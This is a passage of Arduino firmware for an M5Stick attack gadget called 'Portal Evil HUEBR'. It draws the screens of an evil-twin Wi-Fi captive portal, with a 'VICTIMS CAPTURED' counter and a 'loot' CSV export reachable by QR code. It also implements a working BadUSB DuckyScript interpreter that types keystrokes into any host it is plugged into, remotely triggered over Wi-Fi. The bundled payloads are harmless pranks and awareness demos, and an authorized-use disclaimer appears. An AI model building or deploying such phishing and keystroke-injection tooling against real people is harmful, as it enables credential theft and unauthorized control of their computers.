  drawBloodDrip(234, 28, (int)(42 * p));
  drawBloodDrip(237, 28, (int)(88 * p));
}
void drawBloodFrame() { drawBloodFrameP(1.0f); }

// Animate the blood running down the side margins (used on menu transitions).
void animateBloodFrame() {
  for (int f = 1; f <= 6; f++) { drawBloodFrameP(f / 6.0f); delay(20); }
}

// A small white skull with glowing red eyes for the menu header.
void drawHeaderSkull(int cx, int cy) {
  M5.Lcd.fillCircle(cx, cy - 1, 6, C_BONE);               // cranium
  M5.Lcd.fillRoundRect(cx - 4, cy + 3, 8, 4, 1, C_BONE);  // jaw
  M5.Lcd.fillCircle(cx - 2, cy - 1, 2, C_SOCKET);         // eye sockets
  M5.Lcd.fillCircle(cx + 2, cy - 1, 2, C_SOCKET);
  M5.Lcd.fillCircle(cx - 2, cy - 1, 1, C_EYE);            // glowing eyes
  M5.Lcd.fillCircle(cx + 2, cy - 1, 1, C_EYE);
  M5.Lcd.drawFastVLine(cx - 2, cy + 3, 4, C_HDR_BOT);     // teeth gaps
  M5.Lcd.drawFastVLine(cx,     cy + 3, 4, C_HDR_BOT);
  M5.Lcd.drawFastVLine(cx + 2, cy + 3, 4, C_HDR_BOT);
}

// Quick blood-splatter flash over the screen (used when a victim is captured).
void bloodSplat() {
  for (int i = 0; i < 16; i++) {
    int x = random(12, 228), y = random(32, 118), r = random(2, 8);
    M5.Lcd.fillCircle(x, y, r, C_BLOOD);
    M5.Lcd.fillCircle(x + random(-3, 4), y + random(-3, 4), (r > 3 ? r / 2 : 1), C_BLOOD_HI);
    if (r > 5) M5.Lcd.fillRect(x - 1, y, 2, random(5, 16), C_BLOOD);  // a short run
  }
  delay(120);
}

// Boot finale: blood pours from the top of the screen and pools at the bottom.
// Draw-only (append), so it layers over the final skull frame without flicker.
void bloodWash(int durMs) {
  const int N = 15;
  int xs[N], target[N];
  for (int i = 0; i < N; i++) { xs[i] = 6 + i * (228 / (N - 1)); target[i] = 45 + (int)random(0, 85); }
  unsigned long start = millis();
  while (millis() - start < (unsigned long)durMs) {
    float t = (millis() - start) / (float)durMs;
    for (int i = 0; i < N; i++) {
      float st = (i % 3) * 0.10f;
      float p = (t - st) / (1.0f - st);
      if (p < 0) p = 0; if (p > 1) p = 1;
      drawBloodDrip(xs[i], 0, (int)(p * target[i]));
    }
    int pool = (int)(t * 26);
    if (pool > 0) fillVGrad(0, 135 - pool, 240, pool, C_BLOOD_DK, C_BLOOD);
    delay(28);
  }
}

// Boot splash: a smooth vector skull that laughs (jaw drops open/shut, pulsing
// red eyes, slight head bob) with a "HA HA HA!" burst and a progress bar, now
// synced to a real synthesized cackle on the speaker. Runs ~5 seconds.
void bootScreen() {
  M5.Lcd.fillScreen(C_BG);

  // Static elements (drawn once): caption + progress-bar outline.
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("PORTAL EVIL HUEBR  -  loading", 120, 114);
  const int bx = 40, by = 124, bw = 160, bh = 7;
  M5.Lcd.drawRoundRect(bx, by, bw, bh, 3, C_MUTED);

  const int cx = 120;               // skull centre X
  const int cyBase = 38;            // cranium centre Y
  const unsigned long DURATION = 5000;  // ~5 seconds
  unsigned long start = millis();
  bool open = false;

  // Kick off the real synthesized cackle once; it plays (twice) asynchronously
  // while the skull animates. Falls back to the old square-wave beeps if the
  // PCM buffer couldn't be allocated.
  bool laughing = false;
  if (soundOn) {
    buildLaugh();
    if (laughBuf && laughLen) {
      M5.Speaker.playRaw(laughBuf, laughLen, LAUGH_SR, false, 2);
      laughing = true;
    }
  }

  while (millis() - start < DURATION) {
    unsigned long el = millis() - start;
    open = !open;
    int bob = open ? 1 : 0;  // slight head bob

    // Clear the skull + laugh-text band, then redraw this frame.
    M5.Lcd.fillRect(0, 0, 240, 110, C_BG);
    drawSkull(cx, cyBase + bob, open, open ? C_EYE : C_EYEDIM);

    // Blood weeping from the eye sockets, growing as the animation runs.
    int tearLen = (int)(el / 150);
    if (tearLen > 2) {
      int ey = cyBase + bob + 2;
      drawBloodDrip(cx - 18, ey + 6, min(tearLen, 46));
      drawBloodDrip(cx + 18, ey + 6, min(tearLen, 46));
    }

    // "HA HA HA!" burst on the open-jaw frames.
    if (open) {
      M5.Lcd.setTextDatum(MC_DATUM);
      M5.Lcd.setTextSize(2);
      M5.Lcd.setTextColor(C_EYE, C_BG);
      M5.Lcd.drawString("HA HA HA!", 120, 101);
    }

    // Progress bar tracks elapsed time.
    int w = (int)((long)(bw - 6) * el / DURATION);
    if (w > bw - 6) w = bw - 6;
    M5.Lcd.fillRoundRect(bx + 3, by + 3, w, bh - 6, 2, C_ACCENT);

    // Fallback only: if the PCM laugh couldn't allocate, beep per open frame.
    if (soundOn && open && !laughing) {
      M5.Speaker.tone(1500, 45);
      delay(45);
      M5.Speaker.tone(1100, 45);
    }

    delay(180);
  }

  // Ensure the bar reads full before leaving.
  M5.Lcd.fillRoundRect(bx + 3, by + 3, bw - 6, bh - 6, 2, C_ACCENT);
  delay(150);

  // Horror finale: blood pours down the screen and pools at the bottom.
  bloodWash(1400);
  delay(250);
}

// Full dashboard repaint: header, SSID, gateway, and the victim-count card.
void drawMainScreen() {
  M5.Lcd.fillScreen(C_BG);

  // Header bar (blood gradient)
  fillVGrad(0, 0, 240, 26, C_HDR_TOP, C_HDR_BOT);
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE);
  M5.Lcd.drawString("PORTAL EVIL HUEBR", 112, 13);
  drawStatusDot(true);

  // SSID
  M5.Lcd.setTextDatum(TL_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString(twinActive ? ("SSID  >> EVIL TWIN ch" + String((int)twinChannel)) : "SSID", 8, 32);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG);
  String ssidShown = twinActive ? twinSSID : cfgSsid;
  if (ssidShown.length() > 18) ssidShown = ssidShown.substring(0, 17) + "~";
  M5.Lcd.drawString(ssidShown, 8, 42);

  // Battery gauge (top-right of the SSID row)
  drawBattery();

  // Access block: the IP + path to reach each thing (join the Wi-Fi first).
  String ip = APIP.toString();
  M5.Lcd.setTextDatum(TL_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);
  M5.Lcd.drawString("JOIN WI-FI, THEN OPEN:", 8, 61);
  // Portal (victim page) = any URL -> "/"
  M5.Lcd.setTextColor(C_MUTED, C_BG);   M5.Lcd.drawString("Portal", 8, 73);
  M5.Lcd.setTextColor(C_ACCENT2, C_BG); M5.Lcd.drawString("http://" + ip + "/", 56, 73);
  // Admin dashboard = "/admin"
  M5.Lcd.setTextColor(C_MUTED, C_BG);   M5.Lcd.drawString("Admin", 8, 83);
  M5.Lcd.setTextColor(C_ACCENT2, C_BG); M5.Lcd.drawString("http://" + ip + "/admin", 56, 83);

  // Victim-count card
  M5.Lcd.fillRoundRect(3, 96, 234, 36, 8, C_CARD);
  M5.Lcd.setTextDatum(ML_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_CARD);
  M5.Lcd.drawString("VICTIMS CAPTURED", 14, 114);
  M5.Lcd.setTextDatum(MR_DATUM);
  M5.Lcd.setTextSize(4);
  M5.Lcd.setTextColor(C_COUNT, C_CARD);
  M5.Lcd.drawString(String(capcount), 226, 114);

  drawBloodFrame();   // blood running down the screen
}

// On-screen QR for loot retrieval: scan with a phone (joined to the AP) to open
// the admin dashboard or pull the full capture export. The web server keeps
// serving underneath, so the scanned link actually loads.
void drawQRScreen(int page) {
  const char *url, *label, *path;
  if (page == 0) { url = "http://172.0.0.1/admin";      label = "Admin dashboard";   path = "/admin"; }
  else           { url = "http://172.0.0.1/export.csv"; label = "Loot export (CSV)"; path = "/export.csv"; }

  M5.Lcd.fillScreen(C_BG);
  fillVGrad(0, 0, 240, 26, C_HDR_TOP, C_HDR_BOT);
  M5.Lcd.setTextDatum(MC_DATUM);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(TFT_WHITE);
  M5.Lcd.drawString("LOOT - SCAN ME", 120, 13);

  // White quiet zone so phones lock on fast, then the QR itself.
  const int qs = 100, qx = 12, qy = 31;
  M5.Lcd.fillRect(qx - 5, qy - 5, qs + 10, qs + 10, TFT_WHITE);
  M5.Lcd.qrcode(url, qx, qy, qs, 4);

  int tx = 126;
  M5.Lcd.setTextDatum(TL_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(C_MUTED, C_BG);   M5.Lcd.drawString("SCAN TO OPEN", tx, 33);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG); M5.Lcd.drawString(label, tx, 45);
  M5.Lcd.setTextColor(C_ACCENT2, C_BG); M5.Lcd.drawString("172.0.0.1", tx, 62);
  M5.Lcd.setTextColor(C_ACCENT2, C_BG); M5.Lcd.drawString(path, tx, 73);
  M5.Lcd.setTextColor(C_MUTED, C_BG);   M5.Lcd.drawString("Join Wi-Fi first.", tx, 92);
  M5.Lcd.setTextColor(TFT_WHITE, C_BG); M5.Lcd.drawString("A: next", tx, 110);
  M5.Lcd.setTextColor(C_MUTED, C_BG);   M5.Lcd.drawString("hold B: exit", tx + 46, 110);
}

void applyBrightness() {
  M5.Display.setBrightness(BRIGHT_VALS[brightLevel]);
}

// Apply the stored speaker volume (0..100%) to the M5Unified speaker (0..255).
void applyVolume() {
  M5.Speaker.setVolume((uint8_t)map(spkVol, 0, 100, 0, 255));
}

// ======================= WiFi Duck (BadUSB) =======================
// A second project sharing this firmware: the M5StickS3 enumerates as a USB
// keyboard and "types" a DuckyScript payload into the host it is plugged into,
// triggered over Wi-Fi from the control panel. Inspired by the Dstike /
// SpaceHuhn WiFi Duck. For education / authorized testing only.

// Map a DuckyScript key token -> USB HID keycode. Returns 0 if unknown (the
// caller then types the token as a literal single character).
#if DUCK_HID
uint8_t duckKeyCode(const String &tok) {
  String k = tok; k.toUpperCase();
  if (k == "ENTER" || k == "RETURN")       return KEY_RETURN;
  if (k == "ESC"   || k == "ESCAPE")       return KEY_ESC;
  if (k == "TAB")                          return KEY_TAB;
  if (k == "SPACE")                        return ' ';
  if (k == "BACKSPACE" || k == "BKSP")     return KEY_BACKSPACE;
  if (k == "DELETE" || k == "DEL")         return KEY_DELETE;
  if (k == "INSERT" || k == "INS")         return KEY_INSERT;
  if (k == "HOME")                         return KEY_HOME;
  if (k == "END")                          return KEY_END;
  if (k == "PAGEUP"   || k == "PAGE_UP")   return KEY_PAGE_UP;
  if (k == "PAGEDOWN" || k == "PAGE_DOWN") return KEY_PAGE_DOWN;
  if (k == "UP"    || k == "UPARROW")      return KEY_UP_ARROW;
  if (k == "DOWN"  || k == "DOWNARROW")    return KEY_DOWN_ARROW;
  if (k == "LEFT"  || k == "LEFTARROW")    return KEY_LEFT_ARROW;
  if (k == "RIGHT" || k == "RIGHTARROW")   return KEY_RIGHT_ARROW;
  if (k == "CAPSLOCK")                     return KEY_CAPS_LOCK;
  if (k == "GUI" || k == "WINDOWS" || k == "WIN" || k == "META") return KEY_LEFT_GUI;
  if (k == "CTRL"  || k == "CONTROL")      return KEY_LEFT_CTRL;
  if (k == "ALT")                          return KEY_LEFT_ALT;
  if (k == "SHIFT")                        return KEY_LEFT_SHIFT;
  if (k.length() >= 2 && k[0] == 'F') {    // F1..F12
    int n = k.substring(1).toInt();
    if (n >= 1 && n <= 12) return (uint8_t)(KEY_F1 + (n - 1));
  }
  return 0;
}
#endif

// Press a whole line as a simultaneous combo (e.g. "CTRL ALT DELETE", "GUI r").
// Modifiers + named keys resolve through duckKeyCode(); a lone character is
// typed literally. All keys are released together afterwards.
void duckPressCombo(const String &line) {
#if DUCK_HID
  int start = 0, np = 0;
  while (start < (int)line.length() && np < 8) {
    int sp = line.indexOf(' ', start);
    if (sp < 0) sp = line.length();
    String tok = line.substring(start, sp); tok.trim();
    start = sp + 1;
    if (tok.length() == 0) continue;
    uint8_t code = duckKeyCode(tok);
    if (code == 0 && tok.length() == 1) code = (uint8_t)tok[0];  // literal key
    if (code) { DuckKbd.press(code); np++; }
  }
  delay(8);
  DuckKbd.releaseAll();
#endif
}

// Store / update a DuckyScript variable or define (token includes its $ or #).
void duckSetVar(const String &name, const String &val) {
  for (int i = 0; i < duckVarCount; i++)
    if (duckVarName[i] == name) { duckVarVal[i] = val; return; }
  if (duckVarCount < DUCK_MAXVARS) {
    duckVarName[duckVarCount] = name;
    duckVarVal[duckVarCount]  = val;
    duckVarCount++;
  }
}

// Substitute every known $var / #define token in a string, longest names first
// so "$ab" isn't clobbered by an earlier "$a" replacement.
String duckExpand(String s) {
  if (duckVarCount == 0) return s;
  bool done[DUCK_MAXVARS] = { false };
  for (int n = 0; n < duckVarCount; n++) {       // pick the longest remaining name
    int pick = -1;
    for (int i = 0; i < duckVarCount; i++)
      if (!done[i] && (pick < 0 || duckVarName[i].length() > duckVarName[pick].length()))
        pick = i;
    if (pick < 0) break;
    done[pick] = true;
    if (duckVarName[pick].length()) s.replace(duckVarName[pick], duckVarVal[pick]);
  }
  return s;
}

// Execute one DuckyScript line. Only DELAY is non-blocking (it arms
// duckResumeAt); everything else runs inline because lines are short.
void duckRunLine(String line) {
  line.trim();
  if (line.length() == 0) return;

  int sp = line.indexOf(' ');
  String cmd  = (sp < 0) ? line : line.substring(0, sp);
  String rest = (sp < 0) ? ""   : line.substring(sp + 1);
  String CMD  = cmd; CMD.toUpperCase();

  if (CMD == "REM" || CMD.startsWith("//")) return;             // comment

  // DuckyScript 3.0-lite: constants (DEFINE #NAME value) and variables
  // (VAR $x = value). Both are textual substitutions applied to STRING/STRINGLN.
  if (CMD == "DEFINE") {
    int s2 = rest.indexOf(' ');
    if (s2 > 0) duckSetVar(rest.substring(0, s2), rest.substring(s2 + 1));
    return;
  }
  if (CMD == "VAR") {
    int eq = rest.indexOf('=');
    if (eq > 0) {
      String nm = rest.substring(0, eq); nm.trim();
      String vl = rest.substring(eq + 1); vl.trim();
      duckSetVar(nm, vl);
    }
    return;
  }

  if (CMD == "DELAY") {
    rest.trim();
    int dash = rest.indexOf('-');                               // "DELAY 200-800" = random
    long ms;
    if (dash > 0) {
      long lo = rest.substring(0, dash).toInt();
      long hi = rest.substring(dash + 1).toInt();
      ms = (hi > lo) ? random(lo, hi + 1) : lo;
    } else {
      ms = rest.toInt();
    }
    duckResumeAt = millis() + (unsigned long)ms;                // honored by duckTick()
    return;
  }
  if (CMD == "DEFAULTDELAY" || CMD == "DEFAULT_DELAY") {
    duckDefaultDelay = rest.toInt();
    return;
  }
  if (CMD == "REPEAT" || CMD == "REPLAY") {
    int n = rest.toInt();
    for (int i = 0; i < n; i++) duckRunLine(duckPrevLine);      // re-run last line
    return;                                                     // keep prevLine as-is
  }

  if (CMD == "STRING") {
#if DUCK_HID
    DuckKbd.print(duckExpand(rest));
#endif
  } else if (CMD == "STRINGLN") {
#if DUCK_HID
    DuckKbd.print(duckExpand(rest));
    DuckKbd.write(KEY_RETURN);
#endif
  } else {
    duckPressCombo(line);                                       // a key / combo
  }

  if (duckDefaultDelay > 0)                                     // gap between commands
    duckResumeAt = millis() + duckDefaultDelay;
  duckPrevLine = line;
}

// Advance the running script: wait out any DELAY, else run the next line. One
// line per call keeps the web server + buttons responsive while typing.
void duckTick() {
  if (!duckBusy) return;
  if (millis() < duckResumeAt) return;                          // still inside a DELAY
  if (duckLineStart >= (int)duckScript.length()) {              // reached the end
    duckBusy = false;
    duckStatusMsg = "Done (" + String(duckLinesDone) + " lines)";
    return;
  }
  int nl = duckScript.indexOf('\n', duckLineStart);
  if (nl < 0) nl = duckScript.length();
  String line = duckScript.substring(duckLineStart, nl);
  duckLineStart = nl + 1;
  line.replace("\r", "");
  if (line.length()) { duckRunLine(line); duckLinesDone++; }
}

// Load a script into the interpreter and start it from the top.
void duckStartScript(const String &script) {
  duckScript       = script;
  duckLineStart    = 0;
  duckResumeAt     = 0;
  duckDefaultDelay = 0;
  duckVarCount     = 0;        // fresh DEFINE/VAR table per run
  duckPrevLine     = "";
  duckLinesDone    = 0;
  duckLinesTotal   = 0;
  int p = 0;                                                    // count non-empty lines
  while (p < (int)script.length()) {
    int nl = script.indexOf('\n', p); if (nl < 0) nl = script.length();
    String l = script.substring(p, nl); l.trim();
    if (l.length()) duckLinesTotal++;
    p = nl + 1;
  }
  duckBusy = true;
  duckStatusMsg = "Running...";
}

void duckStop() {
#if DUCK_HID
  DuckKbd.releaseAll();
#endif
  duckBusy = false;
  duckStatusMsg = "Stopped";
}

// -------- Saved payloads on LittleFS --------

String duckReadFile(const String &path) {
  File f = LittleFS.open(path, FILE_READ);
  if (!f) return "";
  String s = f.readString();
  f.close();
  return s;
}

bool duckWriteFile(const String &path, const String &data) {
  LittleFS.mkdir(DUCK_DIR);
  File f = LittleFS.open(path, FILE_WRITE);
  if (!f) return false;
  f.print(data);
  f.close();
  return true;
}

// Turn a user-supplied payload name into a safe /duck/<name>.txt path
// (alnum/-/_ only, no path traversal).
String duckPathFor(String name) {
  String clean;
  for (size_t i = 0; i < name.length() && clean.length() < 24; i++) {
    char c = name[i];
    bool ok = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'z') ||
              (c >= 'A' && c <= 'Z') || c == '-' || c == '_';
    if (ok) clean += c;
  }
  if (clean.length() == 0) clean = "payload";
  return String(DUCK_DIR) + "/" + clean + ".txt";
}

// Stream the list of saved payload names as a JSON array.
void sendDuckList() {
  String out = "[";
  bool first = true;
  File dir = LittleFS.open(DUCK_DIR);
  if (dir && dir.isDirectory()) {
    for (File e = dir.openNextFile(); e; e = dir.openNextFile()) {
      String n = String(e.name());
      int slash = n.lastIndexOf('/'); if (slash >= 0) n = n.substring(slash + 1);
      if (n.endsWith(".txt")) {
        n = n.substring(0, n.length() - 4);
        out += (first ? "" : ",") + jsonStr(n);
        first = false;
      }
    }
  }
  out += "]";
  webServer.send(HTTP_CODE, "application/json", out);
}

// Load the saved payload names into the in-memory slot table (for on-device
// arming). Always keeps at least the implicit "payload" default.
void duckLoadSlots() {
  duckSlotCount = 0;
  File dir = LittleFS.open(DUCK_DIR);
  if (dir && dir.isDirectory()) {
    for (File e = dir.openNextFile(); e && duckSlotCount < DUCK_MAXSLOTS; e = dir.openNextFile()) {
      String n = String(e.name());
      int slash = n.lastIndexOf('/'); if (slash >= 0) n = n.substring(slash + 1);
      if (n.endsWith(".txt")) duckSlotName[duckSlotCount++] = n.substring(0, n.length() - 4);
    }
  }
  if (duckSlotCount == 0) duckSlotName[duckSlotCount++] = "payload";
  if (duckArmedSlot >= duckSlotCount) duckArmedSlot = 0;
}

// -------- Built-in payload library (the "ecosystem") --------
// One catalog entry as a JSON object: category / name / description / script.
static String libItem(const char *c, const char *n, const char *d, const char *s) {
  return String("{\"c\":") + jsonStr(c) + ",\"n\":" + jsonStr(n) +
         ",\"d\":" + jsonStr(d) + ",\"s\":" + jsonStr(s) + "}";
}

// Stream the built-in payload library as a JSON array. These are benign,
// classroom-style demos (open an app, type text, lock the screen) that show how
// a USB keyboard injection runs -- US keyboard layout. For authorized teaching
// and lab use only.
void sendDuckLibrary() {
  String o = "["; bool f = true;
  #define LIB(c,n,d,s) do { o += (f ? "" : ","); o += libItem(c,n,d,s); f = false; } while (0)
  // --- Windows ---
  LIB("Windows", "Run dialog", "Open the Run box and launch Notepad (harmless demo).",
      "REM Windows Run demo\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\n");
  LIB("Windows", "Open a website", "Launch the default browser to a safe URL.",
      "REM Open a website\nDELAY 500\nGUI r\nDELAY 300\nSTRING https://example.com\nENTER\n");
  LIB("Windows", "Lock the screen", "Lock the workstation (Win+L).",
      "REM Lock screen\nDELAY 300\nGUI l\n");
  // --- macOS ---
  LIB("macOS", "Spotlight launch", "Open Spotlight and launch an app by name.",
      "REM macOS Spotlight demo\nDELAY 500\nGUI SPACE\nDELAY 400\nSTRING TextEdit\nENTER\n");
  LIB("macOS", "Lock the screen", "Lock the Mac (Ctrl+Cmd+Q).",
      "REM Lock screen\nDELAY 300\nCTRL GUI q\n");
  // --- Linux ---
  LIB("Linux", "Open a terminal", "Open a terminal with the common shortcut.",
      "REM Linux terminal demo\nDELAY 500\nCTRL ALT t\n");
  // --- Text / awareness ---
  LIB("Text", "Type a message", "Type a line of text into the focused field.",
      "REM Type some text\nDELAY 500\nSTRING Hello from Portal Evil HUEBR - WiFi Duck!\nENTER\n");
  LIB("Awareness", "BadUSB demo note", "Opens Notepad and explains what just happened -- a safe awareness demo.",
      "REM Security-awareness demo: show the risk, do no harm\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 900\n"
      "STRINGLN A USB device just typed this by itself.\nSTRINGLN Never leave a machine unlocked with untrusted USB plugged in.\n");
  // --- DuckyScript 3.0-lite feature showcase ---
  LIB("Examples", "DEFINE / VAR + random DELAY", "Shows constants, variables and randomized timing.",
      "REM DuckyScript 3.0-lite features\nDEFINE #APP notepad\nVAR $msg = Variables work!\nDELAY 500\n"
      "GUI r\nDELAY 300-700\nSTRING #APP\nENTER\nDELAY 900\nSTRINGLN $msg\n");
  LIB("Examples", "REPEAT demo", "Types a line, then repeats the last line a few times.",
      "REM REPEAT re-runs the previous line\nDELAY 500\nSTRINGLN tap tap\nREPEAT 3\n");
  // --- More Windows ---
  LIB("Windows", "Task Manager", "Open Task Manager (Ctrl+Shift+Esc).",
      "REM Open Task Manager\nDELAY 400\nCTRL SHIFT ESC\n");
  LIB("Windows", "Show desktop", "Minimize everything to the desktop (Win+D).",
      "REM Show the desktop\nDELAY 300\nGUI d\n");
  LIB("Windows", "Settings", "Open the Windows Settings app (Win+I).",
      "REM Open Settings\nDELAY 300\nGUI i\n");
  LIB("Windows", "Emoji picker", "Open the emoji panel and type one (Win+.).",
      "REM Emoji picker demo\nDELAY 400\nGUI .\nDELAY 600\nENTER\n");
  // --- More macOS ---
  LIB("macOS", "Spotlight -> Notes", "Open Notes via Spotlight and type a line.",
      "REM macOS Notes demo\nDELAY 500\nGUI SPACE\nDELAY 400\nSTRING Notes\nENTER\nDELAY 900\nSTRINGLN Hello from the Stick!\n");
  LIB("macOS", "Mission Control", "Show all windows (Ctrl+Up).",
      "REM Mission Control\nDELAY 300\nCTRL UP\n");
  // --- More Linux ---
  LIB("Linux", "Type in terminal", "Open a terminal and echo a line.",
      "REM Linux echo demo\nDELAY 500\nCTRL ALT t\nDELAY 800\nSTRINGLN echo Hello from the Stick\n");
  // --- More Text / awareness ---
  LIB("Text", "Type an emoji note", "Type a short multi-line note.",
      "REM Multi-line text\nDELAY 400\nSTRINGLN Line one.\nSTRINGLN Line two.\nSTRINGLN Line three.\n");
  LIB("Awareness", "Lock reminder", "Opens Notepad and reminds the user to lock their PC.",
      "REM Awareness: lock your machine\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 900\n"
      "STRINGLN Reminder: press Win+L whenever you step away.\nSTRINGLN Unattended + unlocked = an open door.\n");
  // --- Funny (harmless, reversible pranks; US layout, Windows unless noted) ---
  LIB("Funny", "Rickroll", "Opens the browser to a certain classic music video.",
      "REM Never gonna give you up\nDELAY 500\nGUI r\nDELAY 300\n"
      "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER\n");
  LIB("Funny", "Hacked + Rickroll", "Types a SYSTEM HACKED warning box in Notepad, then rickrolls.",
      "REM Prank: SYSTEM HACKED warning box, then a rickroll\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 900\n"
      "STRINGLN ####################################\n"
      "STRINGLN #                                  #\n"
      "STRINGLN #     !!!  SYSTEM HACKED  !!!      #\n"
      "STRINGLN #      all your base are ours      #\n"
      "STRINGLN #                                  #\n"
      "STRINGLN ####################################\n"
      "STRINGLN    relax... it is a rickroll\n"
      "DELAY 1500\nGUI r\nDELAY 300\n"
      "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER\n");
  LIB("Funny", "Ghost writer", "Opens Notepad and slowly types a spooky message (random delays).",
      "REM Spooky typing\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 900\n"
      "STRING I\nDELAY 300-700\nSTRING  can\nDELAY 300-700\nSTRING  see\nDELAY 300-700\nSTRINGLN  you...\n");
  LIB("Funny", "Dad joke", "Opens Notepad and types a groan-worthy joke.",
      "REM Dad joke\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 900\n"
      "STRINGLN Why did the developer go broke?\nDELAY 800\nSTRINGLN Because he used up all his cache.\n");
  LIB("Funny", "ASCII cat", "Opens Notepad and draws a little cat.",
      "REM ASCII cat\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 900\n"
      "STRINGLN  =^..^=\nSTRINGLN ( meow )\n");
  LIB("Funny", "Caps Lock disco", "Blinks Caps Lock a few times, then leaves it as it was.",
      "REM Caps Lock disco - 4 toggles returns to the original state\nDELAY 500\n"
      "CAPSLOCK\nDELAY 200\nCAPSLOCK\nDELAY 200\nCAPSLOCK\nDELAY 200\nCAPSLOCK\n");
  #undef LIB
  o += "]";
  webServer.send(HTTP_CODE, "application/json", o);
}

// Build a portable text bundle of every saved payload ("=== name ===" headers)
// and offer it as a download.
void sendDuckExport() {
  String out;
  File dir = LittleFS.open(DUCK_DIR);
  if (dir && dir.isDirectory()) {
    for (File e = dir.openNextFile(); e; e = dir.openNextFile()) {
      String n = String(e.name());
      int slash = n.lastIndexOf('/'); if (slash >= 0) n = n.substring(slash + 1);
      if (n.endsWith(".txt")) {
        n = n.substring(0, n.length() - 4);
        out += "=== " + n + " ===\n" + e.readString() + "\n";
      }
    }
  }
  if (out.length() == 0) out = "REM no saved payloads\n";
  webServer.sendHeader("Content-Disposition", "attachment; filename=payloads.duck");
  webServer.send(HTTP_CODE, "text/plain", out);
}

// Parse an exported bundle and save each "=== name ===" section as a payload.
// Returns how many were imported.
int duckImportBundle(const String &b) {
  int count = 0, pos = 0;
  String curName, curBody;
  while (pos < (int)b.length()) {
    int nl = b.indexOf('\n', pos); if (nl < 0) nl = b.length();
    String line = b.substring(pos, nl); pos = nl + 1;
    String t = line; t.trim();
    if (t.startsWith("=== ") && t.endsWith(" ===")) {
      if (curName.length()) { duckWriteFile(duckPathFor(curName), curBody); count++; }
      curName = t.substring(4, t.length() - 4); curName.trim();
      curBody = "";
    } else if (curName.length()) {
      curBody += line + "\n";
    }
  }
  if (curName.length()) { duckWriteFile(duckPathFor(curName), curBody); count++; }
  return count;
}

// -------- Web control panel (served for any path while the Duck is active) --
String duckPanel() {
  String css =
    ":root{--bg:#0d0708;--card:#1a1012;--line:#3a1c1e;--txt:#e9e2e2;--mut:#b09a9a;--accent:#c01818;--ok:#30a36c;--danger:#e5484d}"
    "*{box-sizing:border-box}"
    "body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;line-height:1.5}"
    ".top{background:linear-gradient(90deg,#3a0607,#b11212);padding:18px 20px;position:relative;border-bottom:3px solid #6e0a0a}"
    ".top::after{content:'';position:absolute;left:0;right:0;top:100%;height:16px;z-index:5;background:radial-gradient(10px 15px at 14px 0,#9e0f0f 58%,transparent 60%) repeat-x;background-size:46px 16px}"
    ".top h1{margin:0;font-size:20px}.top p{margin:3px 0 0;color:#f0c9c9;font-size:13px}"
    ".wrap{max-width:860px;margin:0 auto;padding:16px}"
    ".card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px;margin:0 0 16px}"
    ".sec{font-size:12px;text-transform:uppercase;letter-spacing:.6px;color:#ff8a8a;font-weight:700;margin:0 0 12px}"
    "textarea{width:100%;min-height:230px;padding:12px;border-radius:10px;border:1px solid var(--line);background:#0c0f14;color:#e9e2e2;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:14px;line-height:1.45;resize:vertical}"
    ".bar{display:flex;gap:10px;flex-wrap:wrap;margin:12px 0 0}"
    ".btn{display:inline-block;padding:10px 16px;border-radius:10px;border:1px solid var(--line);background:var(--card);color:var(--txt);font-size:15px;cursor:pointer}"
    ".btn:hover{border-color:var(--accent)}"
    ".btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}"
    ".btn.stop{background:transparent;border-color:var(--danger);color:#ff9a9d}"
    ".btn.stop:hover{background:var(--danger);color:#fff}"
    ".row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}"
    "input,select{padding:9px 11px;border-radius:9px;border:1px solid var(--line);background:#10131a;color:var(--txt);font-size:14px}"
    "input{flex:1;min-width:140px}"
    ".st{display:inline-flex;align-items:center;gap:8px;font-size:14px;color:var(--mut)}"
    ".dot{width:10px;height:10px;border-radius:50%;background:var(--ok)}"
    ".dot.run{background:var(--danger);animation:bl .6s steps(2) infinite}@keyframes bl{to{opacity:.25}}"
    ".warn{background:rgba(229,72,77,.12);border:1px solid var(--danger);color:#ff9a9d;border-radius:10px;padding:10px 14px;margin:0 0 16px;font-size:13px}"
    ".grid{display:grid;grid-template-columns:1fr 1fr;gap:4px 18px;font-size:13px;color:var(--mut)}"
    ".grid code{color:#7ee2b8;background:#0c0f14;border:1px solid var(--line);border-radius:5px;padding:1px 6px}"
    ".grid i{color:var(--mut);font-style:italic}"
    "code.k{color:#ff8a8a}"
    ".hint{color:var(--mut);font-size:12px;margin:8px 0 0}"
    ".hint code{color:#7ee2b8}";

  String warn = DUCK_HID
    ? ""
